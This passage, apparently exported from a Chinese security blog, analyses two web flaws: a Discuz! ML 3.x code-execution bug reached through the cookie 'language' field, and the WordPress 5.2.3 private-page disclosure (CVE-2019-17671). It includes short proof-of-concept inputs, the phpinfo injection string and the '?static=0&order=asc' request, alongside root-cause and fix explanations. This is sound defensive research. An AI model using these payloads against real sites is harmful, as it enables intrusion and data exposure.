data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/5a301814f5679822fd941f96e3aff9bb.png\"></p>\n<p>在这里，从cookie中取出language值，未经过滤，直接赋值给$lng变量</p>\n<p>接着将$lng值赋值给名为DISCUZ_LANG的常量</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/9cd8f9c903e9c0898cfaa4970d014328.png\"></p>\n<p>在Discuz! ML中，在生成cachefile名时，需要使用到DISCUZ_LANG这个常量进行拼接</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/200495f42362d36df811a8aae17e54e5.png\"></p>\n<p>由于DISCUZ_LANG常量由cookie中传递而来，并未经过任何过滤，因此DISCUZ_LANG常量可控</p>\n<p>&nbsp;</p>\n<p>在程序运行时，Discuz! ML会将template/default/common目录下的默认模板写入缓存</p>\n<p>在这个过程中，程序首先会打开并读取位于template/default/common目录下默认模板中的内容：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/4728787a3cba82433fc3d3fd9b3ab124.png\"></p>\n<p>这里将读取的header.htm模板中的内容赋值给$template变量</p>\n<p>&nbsp;</p>\n<p>再读取默认模板内容之后，程序接下来通过preg_replace_callback方法对模板内容进行替换与修改</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/8cc38ce61df32dc7b7d51c6e856e1372.png\"></p>\n<p>在对默认模板内容进行修改时，注意如下图片中操作</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/423679b9a066fecd6550006cf68a4217.png\"></p>\n<p>上图操作中，会将’$tplfile’, ‘$fname’, “.time().”, ‘$templateid’, ‘$cachefile’, ‘$tpldir’, ‘$file’这些变量值拼接到名为headeradd的变量中</p>\n<p>&nbsp;</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/e3ddd6682f0ece27b9424bdc9434fb96.png\"></p>\n<p>Headeradd变量随后被拼接到$template中</p>\n<p>&nbsp;</p>\n<p>注意这里的headeradd变量</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/27c609d1f8e1849863fba2ee289f7835.png\"></p>\n<p>如上图红圈处，这里将cachefile变量拼接到headeradd变量中，间接的将cachfile变量拼接到template中。</p>\n<p>还记得cachefile变量吗？</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/200495f42362d36df811a8aae17e54e5.png\"></p>\n<p>Cachefile变量的值，其中一部分是可控的</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/39c1861505bb7b2cc9d80cfb98dde40e.png\"></p>\n<p>例如上图，我们可以在其中插入形如 sc.’phpinfo().’的payload</p>\n<p>这个payload随着headeradd变量，被带入template中</p>\n<p>接下来，被污染的template值被写入缓存文件中</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/fc5d5be10b4c6577c6f7c3caee88f0f9.png\"></p>\n<p>如上图可见，最终写入的缓存文件名即为cachefile的值，内容即为template值，Payload已经随着headeradd拼接到template而被写入这个缓存文件中</p>\n<p>上图这里看起来比较杂乱，简化起来如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/5f872ac8ce662e4f8fe7141128f4f97f.png\"></p>\n<p>当缓存文件被注入如上文payload后，再次加载程序，</p>\n<p>当程序执行到位于\\source\\module\\forum\\forum_index.php处时：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/8d202ec852784f1506f1f667d23c5acb.png\"></p>\n<p>可见上图432行，会使用include方法包含 template方法的返回值</p>\n<p>&nbsp;</p>\n<p>跟进Template方法，找到其返回值，即是此处被include中的内容</p>\n<p>Template方法位于\\source\\function\\function_core.php</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/f6901cb506f6d06be066992005264466.png\"></p>\n<p>在其654行处，可见返回cachefile路径，cachefile即为上文被植入payload的文件路径</p>\n<p>由此，被插入payload的缓存文件被include，其中构造好的payload被执行，造成代码执行漏洞</p>\n<p>&nbsp;</p>\n<h1 id=\"0x04-修复建议\"><a href=\"#0x04-修复建议\" class=\"headerlink\" title=\"0x04  修复建议\"></a><strong>0x04</strong>  <strong>修复建议</strong></h1><hr>\n<p>目前官方没有进行修复，请时刻关注：<a href=\"https://bitbucket.org/vot/discuz.ml/commits/all%EF%BC%8C%E7%AD%89%E5%BE%85%E5%AE%98%E6%96%B9%E8%A1%A5%E4%B8%81%E3%80%82\">https://bitbucket.org/vot/discuz.ml/commits/all，等待官方补丁。</a></p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"<p>Discuz！ML是一个由CodersClub.org创建的多语言，集成，功能齐全的开源网络平台，用于构建像“社交网络”这样的互联网社区。该引擎基于Comsenz Inc.创建的着名的Discuz！X引擎开发。</p>\n<p>&nbsp;2019年7月11日， Discuz！ML被发现存在一处远程代码执行漏洞，攻击者通过在请求流量的cookie字段中的language参数处插入构造的payload，进行远程代码执行利用，该漏洞利用方式简单，危害性较大。</p>","more":"<h1 id=\"0x01-漏洞描述\"><a href=\"#0x01-漏洞描述\" class=\"headerlink\" title=\"0x01 漏洞描述\"></a><strong>0x01 漏洞描述</strong></h1><hr>\n<p>2019年7月11日， Discuz！ML被发现存在一处远程代码执行漏洞，攻击者通过在请求流量的cookie字段中的language参数处插入构造的payload，进行远程代码执行利用，该漏洞利用方式简单，危害性较大。</p>\n<p>本次漏洞是由于Discuz! ML对于cookie字段的不恰当处理造成的</p>\n<p>cookie字段中的language参数未经过滤，直接被拼接写入缓存文件之中，而缓存文件随后又被加载，从而造成代码执行</p>\n<p>简而言之，如下图流程可以简单的理解该漏洞</p>\n<p>首先，通过cookie传入payload，构造好的payload被写入template文件中</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/7995123cf0180b71dfc3d5a14f812f0d.png\"></p>\n<p>接着，这个被插入payload的template.php文件被include，造成代码执行</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/560fe841e93e9950aa9d23d2293d09c8.png\"></p>\n<p>&nbsp;</p>\n<h1 id=\"0x02-受影响的系统版本\"><a href=\"#0x02-受影响的系统版本\" class=\"headerlink\" title=\"0x02 受影响的系统版本\"></a><strong>0x02 受影响的系统版本</strong></h1><hr>\n<p>Discuz! ML v.3.4</p>\n<p>Discuz! ML v.3.3</p>\n<p>Discuz! ML v.3.2</p>\n<p>&nbsp;</p>\n<h1 id=\"0x03-漏洞分析\"><a href=\"#0x03-漏洞分析\" class=\"headerlink\" title=\"0x03 漏洞分析\"></a><strong>0x03 漏洞分析</strong></h1><hr>\n<p>本次漏洞是由于Discuz! ML于对于cookie字段的不恰当处理造成的</p>\n<p>程序对cookie中的language字段的操作过程，位于\\source\\class\\discuz\\discuz_application.php中</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/5a301814f5679822fd941f96e3aff9bb.png\"></p>\n<p>在这里，从cookie中取出language值，未经过滤，直接赋值给$lng变量</p>\n<p>接着将$lng值赋值给名为DISCUZ_LANG的常量</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/9cd8f9c903e9c0898cfaa4970d014328.png\"></p>\n<p>在Discuz! ML中，在生成cachefile名时，需要使用到DISCUZ_LANG这个常量进行拼接</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/200495f42362d36df811a8aae17e54e5.png\"></p>\n<p>由于DISCUZ_LANG常量由cookie中传递而来，并未经过任何过滤，因此DISCUZ_LANG常量可控</p>\n<p>&nbsp;</p>\n<p>在程序运行时，Discuz! ML会将template/default/common目录下的默认模板写入缓存</p>\n<p>在这个过程中，程序首先会打开并读取位于template/default/common目录下默认模板中的内容：</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/4728787a3cba82433fc3d3fd9b3ab124.png\"></p>\n<p>这里将读取的header.htm模板中的内容赋值给$template变量</p>\n<p>&nbsp;</p>\n<p>再读取默认模板内容之后，程序接下来通过preg_replace_callback方法对模板内容进行替换与修改</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/8cc38ce61df32dc7b7d51c6e856e1372.png\"></p>\n<p>在对默认模板内容进行修改时，注意如下图片中操作</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/423679b9a066fecd6550006cf68a4217.png\"></p>\n<p>上图操作中，会将’$tplfile’, ‘$fname’, “.time().”, ‘$templateid’, ‘$cachefile’, ‘$tpldir’, ‘$file’这些变量值拼接到名为headeradd的变量中</p>\n<p>&nbsp;</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/e3ddd6682f0ece27b9424bdc9434fb96.png\"></p>\n<p>Headeradd变量随后被拼接到$template中</p>\n<p>&nbsp;</p>\n<p>注意这里的headeradd变量</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/27c609d1f8e1849863fba2ee289f7835.png\"></p>\n<p>如上图红圈处，这里将cachefile变量拼接到headeradd变量中，间接的将cachfile变量拼接到template中。</p>\n<p>还记得cachefile变量吗？</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/200495f42362d36df811a8aae17e54e5.png\"></p>\n<p>Cachefile变量的值，其中一部分是可控的</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/39c1861505bb7b2cc9d80cfb98dde40e.png\"></p>\n<p>例如上图，我们可以在其中插入形如 sc.’phpinfo().’的payload</p>\n<p>这个payload随着headeradd变量，被带入template中</p>\n<p>接下来，被污染的template值被写入缓存文件中</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/fc5d5be10b4c6577c6f7c3caee88f0f9.png\"></p>\n<p>如上图可见，最终写入的缓存文件名即为cachefile的值，内容即为template值，Payload已经随着headeradd拼接到template而被写入这个缓存文件中</p>\n<p>上图这里看起来比较杂乱，简化起来如下图</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/5f872ac8ce662e4f8fe7141128f4f97f.png\"></p>\n<p>当缓存文件被注入如上文payload后，再次加载程序，</p>\n<p>当程序执行到位于\\source\\module\\forum\\forum_index.php处时：</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/8d202ec852784f1506f1f667d23c5acb.png\"></p>\n<p>可见上图432行，会使用include方法包含 template方法的返回值</p>\n<p>&nbsp;</p>\n<p>跟进Template方法，找到其返回值，即是此处被include中的内容</p>\n<p>Template方法位于\\source\\function\\function_core.php</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/f6901cb506f6d06be066992005264466.png\"></p>\n<p>在其654行处，可见返回cachefile路径，cachefile即为上文被植入payload的文件路径</p>\n<p>由此，被插入payload的缓存文件被include，其中构造好的payload被执行，造成代码执行漏洞</p>\n<p>&nbsp;</p>\n<h1 id=\"0x04-修复建议\"><a href=\"#0x04-修复建议\" class=\"headerlink\" title=\"0x04  修复建议\"></a><strong>0x04</strong>  <strong>修复建议</strong></h1><hr>\n<p>目前官方没有进行修复，请时刻关注：<a href=\"https://bitbucket.org/vot/discuz.ml/commits/all%EF%BC%8C%E7%AD%89%E5%BE%85%E5%AE%98%E6%96%B9%E8%A1%A5%E4%B8%81%E3%80%82\">https://bitbucket.org/vot/discuz.ml/commits/all，等待官方补丁。</a></p>"},{"title":"Wordpress 5.2.3 未授权页面查看漏洞（CVE-2019-17671）","date":"2019-11-13T09:14:31.000Z","cover":"https://s2.ax1x.com/2019/11/14/MY7GiF.jpg","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\nWordPress在5.2.3版本之前，存在着一处未授权页面查看漏洞，攻击者可以在未授权的情况下，查看所有私密页面或是已经删除至回收站的页面\n\n<!--more-->\n\n这个漏洞，请注意我的描述用字，是私密页面查看，而非私密文章查看，这点很关键，在wordpress中，POST指的是文章，Page指的是页面，这两个不是同一个概念，如下图\n\n![MJZS78.png](https://s2.ax1x.com/2019/11/13/MJZS78.png)\n\n页面：\n\n用户可以单独建立一个固定页面，可以作为留言板，或者通知的单页面，发布之后是固定的网址。页面并不能被分类、亦不能拥有标签，但是它们可以有层级关系。可将页面附属在另一个页面之下\n\n文章：\n\n文章可以通过标签实现相关文章的链接，可以放评论和评论框来实现与用户的互动，页面没有。文章有栏目可以归档，还有标签，页面没有。编辑文章时可选不同的形式，页面没有。\n\n利用这个漏洞，攻击者并不能查看未发布的文章，只能有一定几率查看私密或已以至回收站的页面\n\n## 漏洞分析\n\n我们将自上而下，从wordpress入口到漏洞触发点，来分析该漏洞\n\n首先来看位于\\\\wp-includes\\\\class-wp.php 中的WP类，该类为WordPress环境设置类\n\n在WP类中，存在\\$public_query_vars数组，该数组用来定义公共查询变量，如下图\n\n![MYH2hF.png](https://s2.ax1x.com/2019/11/14/MYH2hF.png)\n\n在WP类中，存在main方法，该方法用来设置WordPress环境所需的所有变量，如下图\n\n![MY73IU.png](https://s2.ax1x.com/2019/11/14/MY73IU.png)\n\nWordpress启动时，会调用WP类中的main方法，进行环境遍历赋值，位于上图main方法737行处，可见调用parse_request方法\n\nparse_request方法的作用是，解析请求(GET/POST)以找到正确的WordPress查询，根据请求设置查询变量。如下图\n\n![MJVO1A.png](https://s2.ax1x.com/2019/11/13/MJVO1A.png)\n\n该方法中存在一处foreach循环，遍历WP类中定义的\\$public_query_vars数组值，如下图\n\n![MJZeBV.png](https://s2.ax1x.com/2019/11/13/MJZeBV.png)\n\n该处循环的作用，是寻找\\$public_query_vars数组中的值，是否存在于GET/POST请求的参数中，如过在请求的参数中找到，就将其参数键与值赋值到WP环境变量中去，\\$public_query_vars数组见上文\n\n例如有如下payload请求\n\nhttp://127.0.0.1/wordpress/?static=0&order=asc&kumamon=test\n\n\\$public_query_vars数组中存在”order”与” static”\n\n![MJVI0K.png](https://s2.ax1x.com/2019/11/13/MJVI0K.png)\n\n而GET请求的参数中也存在这两个参数，于是程序会将GET中order与static的值赋值给\\$this-\\>query_vars[‘order’]与\\$this-\\>query_vars[‘static]，如下图\n\n![MJV7kD.png](https://s2.ax1x.com/2019/11/13/MJV7kD.png)\n\n\\$public_query_vars数组中并无”kumamon”，因此GET请求中的kumamon变量不做处理\n\nWordpress的环境变量机制了解完毕后，接下来看下漏洞触发点\n\n\n\n首先来看下\n\n\\\\wp-includes\\\\class-wp-query.php中的parse_query方法\n\n该方法也是在wordpress启动时入口处被一系列的调用加载进来的,执行顺序位于parse_request方法之后，也就是环境变量赋值之后\n\n![MY7YRJ.png](https://s2.ax1x.com/2019/11/14/MY7YRJ.png)\n\n我们重点关注下\\$qv变量，如下图红框处\n\n![MJZm7T.png](https://s2.ax1x.com/2019/11/13/MJZm7T.png)\n\n该变量为\\$this-\\>query_vars引用而来的，而\\$this-\\>query_vars则是\\$this-\\>query_vars经过fill_query_vars方法处理之后的值\n\n当我们的请求为http://127.0.0.1/wordpress/?static=0&order=asc\n\n\\$this-\\>query_vars值如下，该值由parse_request方法得来\n\n![MJVHte.png](https://s2.ax1x.com/2019/11/13/MJVHte.png)\n\n而fill_query_vars方法，是将其他并未从请求中传递与赋值的环境变量用空值赋值\n\n我们这里仅仅通过请求赋值了static与order两个环境变量，因此\\$this-\\>query_vars值如下\n\n![MJVjXt.png](https://s2.ax1x.com/2019/11/13/MJVjXt.png)\n\n\\$qv为\\$this-\\>query_vars引用，因此其中值与上图一致\n\n接下来，位于805行处，有如下if-else条件\n\n![MJVX6I.png](https://s2.ax1x.com/2019/11/13/MJVX6I.png)\n\n由于我们通过GET请求传入static变量，已经将\\$qv[‘static’]赋值为0，因此可以进入上图条件分支，使得\\$this-\\>is_page=true,\n\\$this-\\>is_single=false\n\n还记得之前所说，Page指的是页面吗？因此上文的这个if条件，是为了通过检查请求中是否有'static'、'pagename'、'page_id'值，来判断是否要进行页面(Page)处理，如果是，则将\\$this-\\>is_page设置为true\n\n继续向下看，位于3043行处，存在如下if条件分支\n\n![MJVbfH.png](https://s2.ax1x.com/2019/11/13/MJVbfH.png)\n\n此时\\$this-\\>is_page=true, \\$this-\\>is_single=false，所以if中(\n\\$this-\\>is_single \\|\\| \\$this-\\>is_page )处的值为true。\n\n只要使得\\$this-\\>posts不为空，则可以进入此处if分支\n\n\\$this-\\>posts值为如下sql语句的查询值\n\n![MY7Krq.png](https://s2.ax1x.com/2019/11/14/MY7Krq.png)\n\n这里解释下，为什么sql语句WHERE中wp_posts.post_type = 'page' 且ORDER BY\nwp_posts.post_date ASC\n\n首先看下wp_posts.post_type = 'page'\n\n由于上文设置了\\$this-\\>is_page=true，因此进入如下条件分支\n\n![MJZAcn.png](https://s2.ax1x.com/2019/11/13/MJZAcn.png)\n\n此处设置了查询条件为wp_posts.post_type =\n'page'。显然，\\$this-\\>is_page=true，是要在库中查找page类型的发布\n\nORDER BY wp_posts.post_date\nASC的原因是由于我们GET请求中传入的order参数为ASC，其order为环境变量，在这里被直接拿来拼接sql语句了\n\n在了解了wordpress此时的查询语句，我们对照后台数据库中wp_posts表的内容分析下\n\nwp_posts表中存储了wordpress所有发布的内容，并同过post_type对其进行类型区分\n\n![MJVLpd.png](https://s2.ax1x.com/2019/11/13/MJVLpd.png)\n\nPost_type 为post的，代表其为文章(POST)；而page，代表这是一个页面\n\n因此我们的\\$this-\\>is_page=true，使得程序从该中查询所有page类型的发布内容，也就是说，把所有的页面都提取出来了\n\n![MJZZn0.png](https://s2.ax1x.com/2019/11/13/MJZZn0.png)\n\n注意这里：这条查询，把所有的page都查询出来，不管其状态是发布(publish)或是private(私密)甚至是回收站(trash)。并且通过发布时间升序排列，至于需要设置升序排列的原因，后文会介绍。\n\n继续回到漏洞点\n\n![MJZuAU.png](https://s2.ax1x.com/2019/11/13/MJZuAU.png)\n\n此时我们已经搞清楚\\$this-\\>posts是什么了，如上文所说，\\$this-\\>posts存放着从wp_posts表中取出的所有页面(Page)，并且通过时间顺序升序排列\n\n![MJZEXq.png](https://s2.ax1x.com/2019/11/13/MJZEXq.png)\n\n这时候\\$this-\\>post[0]即为存放在数据库中最早发布的那篇页面(Page)，由于我的示范页面没有删，所以这里的\\$this-\\>post[0]就是那篇示范页面\n\n![MJVz0f.png](https://s2.ax1x.com/2019/11/13/MJVz0f.png)\n\n而\\$this-\\>post[2]就是我们的私密的页面，如下图，可见post_status为private\n\n![MJVxnP.png](https://s2.ax1x.com/2019/11/13/MJVxnP.png)\n\n为什么要用ASC将我们最早发布的页面放在\\$this-\\>post[0]位置呢？原因如下\n\n![MY71aT.png](https://s2.ax1x.com/2019/11/14/MY71aT.png)\n\n程序会检查\\$this-\\>post[0]的发布状态，如上图前两个红框，并判断\\$this-\\>post[0]的发布状态是否是public，若\\$this-\\>post[0]的发布状态不为public，则接下来进行登陆与身份验证\n\n因此通过ASC升序排列，尽可能的把最早发布的页面排在\\$this-\\>post[0]，这个\\$this-\\>post[0]大概率是wordpress示例页面或者是网站自行添加的说明页面，其状态大概率是public，因此通过这个技巧绕过了后续登陆校验的环节，直接把所有页面显示出来\n\n我们新建一个私密测试页面，如下图\n\n![MJV5m6.png](https://s2.ax1x.com/2019/11/13/MJV5m6.png)\n\n建立一个回收站页面测试，并把它丢到回收站，如下图\n\n![MY7JG4.png](https://s2.ax1x.com/2019/11/14/MY7JG4.png)\n\n通过我们的payload，可见私密以及回收站的Page都可被查看\n\n![MJVoTO.png](https://s2.ax1x.com/2019/11/13/MJVoTO.png)\n\n若我们没有设置order=asc，则\\$this-\\>post[0]为我最后丢掉回收站里的Page(默认是用发布时间降序排序，而丢到回收站的那篇是我测试时最后新建的),它的状态是trash而非public，因此wordpress触发登陆校验，如下图\n\n![MJZ9AS.png](https://s2.ax1x.com/2019/11/13/MJZ9AS.png)\n\n## 漏洞修复\n\n![MY7tz9.png](https://s2.ax1x.com/2019/11/14/MY7tz9.png)\n\n漏洞修复其实很容易理解：\n\n开发者把\\$public_query_vars数组中的static给删了，这样就算请求中传入static的值，也会被忽略，记得上文http://127.0.0.1/wordpress/?static=0&order=asc&kumamon=test\n\n中的kumamon参数吗？\n\n其次，开发者把’’\n!=\\$qv[‘static’]这个条件也删除了，这样的话，只能通过pagename或者page_id查询单条page了，然而单条page在显示时，是需要验证其状态的，非public的单条page是不予显示的","source":"_posts/CVE-2019-17671.md","raw":"---\ntitle: Wordpress 5.2.3 未授权页面查看漏洞（CVE-2019-17671）\ndate: 2019-11-13 17:14:31\ntags: web漏洞分析\ncategories: 技术\ncover: https://s2.ax1x.com/2019/11/14/MY7GiF.jpg\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\nWordPress在5.2.3版本之前，存在着一处未授权页面查看漏洞，攻击者可以在未授权的情况下，查看所有私密页面或是已经删除至回收站的页面\n\n<!--more-->\n\n这个漏洞，请注意我的描述用字，是私密页面查看，而非私密文章查看，这点很关键，在wordpress中，POST指的是文章，Page指的是页面，这两个不是同一个概念，如下图\n\n![MJZS78.png](https://s2.ax1x.com/2019/11/13/MJZS78.png)\n\n页面：\n\n用户可以单独建立一个固定页面，可以作为留言板，或者通知的单页面，发布之后是固定的网址。页面并不能被分类、亦不能拥有标签，但是它们可以有层级关系。可将页面附属在另一个页面之下\n\n文章：\n\n文章可以通过标签实现相关文章的链接，可以放评论和评论框来实现与用户的互动，页面没有。文章有栏目可以归档，还有标签，页面没有。编辑文章时可选不同的形式，页面没有。\n\n利用这个漏洞，攻击者并不能查看未发布的文章，只能有一定几率查看私密或已以至回收站的页面\n\n## 漏洞分析\n\n我们将自上而下，从wordpress入口到漏洞触发点，来分析该漏洞\n\n首先来看位于\\\\wp-includes\\\\class-wp.php 中的WP类，该类为WordPress环境设置类\n\n在WP类中，存在\\$public_query_vars数组，该数组用来定义公共查询变量，如下图\n\n![MYH2hF.png](https://s2.ax1x.com/2019/11/14/MYH2hF.png)\n\n在WP类中，存在main方法，该方法用来设置WordPress环境所需的所有变量，如下图\n\n![MY73IU.png](https://s2.ax1x.com/2019/11/14/MY73IU.png)\n\nWordpress启动时，会调用WP类中的main方法，进行环境遍历赋值，位于上图main方法737行处，可见调用parse_request方法\n\nparse_request方法的作用是，解析请求(GET/POST)以找到正确的WordPress查询，根据请求设置查询变量。如下图\n\n![MJVO1A.png](https://s2.ax1x.com/2019/11/13/MJVO1A.png)\n\n该方法中存在一处foreach循环，遍历WP类中定义的\\$public_query_vars数组值，如下图\n\n![MJZeBV.png](https://s2.ax1x.com/2019/11/13/MJZeBV.png)\n\n该处循环的作用，是寻找\\$public_query_vars数组中的值，是否存在于GET/POST请求的参数中，如过在请求的参数中找到，就将其参数键与值赋值到WP环境变量中去，\\$public_query_vars数组见上文\n\n例如有如下payload请求\n\nhttp://127.0.0.1/wordpress/?static=0&order=asc&kumamon=test\n\n\\$public_query_vars数组中存在”order”与” static”\n\n![MJVI0K.png](https://s2.ax1x.com/2019/11/13/MJVI0K.png)\n\n而GET请求的参数中也存在这两个参数，于是程序会将GET中order与static的值赋值给\\$this-\\>query_vars[‘order’]与\\$this-\\>query_vars[‘static]，如下图\n\n![MJV7kD.png](https://s2.ax1x.com/2019/11/13/MJV7kD.png)\n\n\\$public_query_vars数组中并无”kumamon”，因此GET请求中的kumamon变量不做处理\n\nWordpress的环境变量机制了解完毕后，接下来看下漏洞触发点\n\n\n\n首先来看下\n\n\\\\wp-includes\\\\class-wp-query.php中的parse_query方法\n\n该方法也是在wordpress启动时入口处被一系列的调用加载进来的,执行顺序位于parse_request方法之后，也就是环境变量赋值之后\n\n![MY7YRJ.png](https://s2.ax1x.com/2019/11/14/MY7YRJ.png)\n\n我们重点关注下\\$qv变量，如下图红框处\n\n![MJZm7T.png](https://s2.ax1x.com/2019/11/13/MJZm7T.png)\n\n该变量为\\$this-\\>query_vars引用而来的，而\\$this-\\>query_vars则是\\$this-\\>query_vars经过fill_query_vars方法处理之后的值\n\n当我们的请求为http://127.0.0.1/wordpress/?static=0&order=asc\n\n\\$this-\\>query_vars值如下，该值由parse_request方法得来\n\n![MJVHte.png](https://s2.ax1x.com/2019/11/13/MJVHte.png)\n\n而fill_query_vars方法，是将其他并未从请求中传递与赋值的环境变量用空值赋值\n\n我们这里仅仅通过请求赋值了static与order两个环境变量，因此\\$this-\\>query_vars值如下\n\n![MJVjXt.png](https://s2.ax1x.com/2019/11/13/MJVjXt.png)\n\n\\$qv为\\$this-\\>query_vars引用，因此其中值与上图一致\n\n接下来，位于805行处，有如下if-else条件\n\n![MJVX6I.png](https://s2.ax1x.com/2019/11/13/MJVX6I.png)\n\n由于我们通过GET请求传入static变量，已经将\\$qv[‘static’]赋值为0，因此可以进入上图条件分支，使得\\$this-\\>is_page=true,\n\\$this-\\>is_single=false\n\n还记得之前所说，Page指的是页面吗？因此上文的这个if条件，是为了通过检查请求中是否有'static'、'pagename'、'page_id'值，来判断是否要进行页面(Page)处理，如果是，则将\\$this-\\>is_page设置为true\n\n继续向下看，位于3043行处，存在如下if条件分支\n\n![MJVbfH.png](https://s2.ax1x.com/2019/11/13/MJVbfH.png)\n\n此时\\$this-\\>is_page=true, \\$this-\\>is_single=false，所以if中(\n\\$this-\\>is_single \\|\\| \\$this-\\>is_page )处的值为true。\n\n只要使得\\$this-\\>posts不为空，则可以进入此处if分支\n\n\\$this-\\>posts值为如下sql语句的查询值\n\n![MY7Krq.png](https://s2.ax1x.com/2019/11/14/MY7Krq.png)\n\n这里解释下，为什么sql语句WHERE中wp_posts.post_type = 'page' 且ORDER BY\nwp_posts.post_date ASC\n\n首先看下wp_posts.post_type = 'page'\n\n由于上文设置了\\$this-\\>is_page=true，因此进入如下条件分支\n\n![MJZAcn.png](https://s2.ax1x.com/2019/11/13/MJZAcn.png)\n\n此处设置了查询条件为wp_posts.post_type =\n'page'。显然，\\$this-\\>is_page=true，是要在库中查找page类型的发布\n\nORDER BY wp_posts.post_date\nASC的原因是由于我们GET请求中传入的order参数为ASC，其order为环境变量，在这里被直接拿来拼接sql语句了\n\n在了解了wordpress此时的查询语句，我们对照后台数据库中wp_posts表的内容分析下\n\nwp_posts表中存储了wordpress所有发布的内容，并同过post_type对其进行类型区分\n\n![MJVLpd.png](https://s2.ax1x.com/2019/11/13/MJVLpd.png)\n\nPost_type 为post的，代表其为文章(POST)；而page，代表这是一个页面\n\n因此我们的\\$this-\\>is_page=true，使得程序从该中查询所有page类型的发布内容，也就是说，把所有的页面都提取出来了\n\n![MJZZn0.png](https://s2.ax1x.com/2019/11/13/MJZZn0.png)\n\n注意这里：这条查询，把所有的page都查询出来，不管其状态是发布(publish)或是private(私密)甚至是回收站(trash)。并且通过发布时间升序排列，至于需要设置升序排列的原因，后文会介绍。\n\n继续回到漏洞点\n\n![MJZuAU.png](https://s2.ax1x.com/2019/11/13/MJZuAU.png)\n\n此时我们已经搞清楚\\$this-\\>posts是什么了，如上文所说，\\$this-\\>posts存放着从wp_posts表中取出的所有页面(Page)，并且通过时间顺序升序排列\n\n![MJZEXq.png](https://s2.ax1x.com/2019/11/13/MJZEXq.png)\n\n这时候\\$this-\\>post[0]即为存放在数据库中最早发布的那篇页面(Page)，由于我的示范页面没有删，所以这里的\\$this-\\>post[0]就是那篇示范页面\n\n![MJVz0f.png](https://s2.ax1x.com/2019/11/13/MJVz0f.png)\n\n而\\$this-\\>post[2]就是我们的私密的页面，如下图，可见post_status为private\n\n![MJVxnP.png](https://s2.ax1x.com/2019/11/13/MJVxnP.png)\n\n为什么要用ASC将我们最早发布的页面放在\\$this-\\>post[0]位置呢？原因如下\n\n![MY71aT.png](https://s2.ax1x.com/2019/11/14/MY71aT.png)\n\n程序会检查\\$this-\\>post[0]的发布状态，如上图前两个红框，并判断\\$this-\\>post[0]的发布状态是否是public，若\\$this-\\>post[0]的发布状态不为public，则接下来进行登陆与身份验证\n\n因此通过A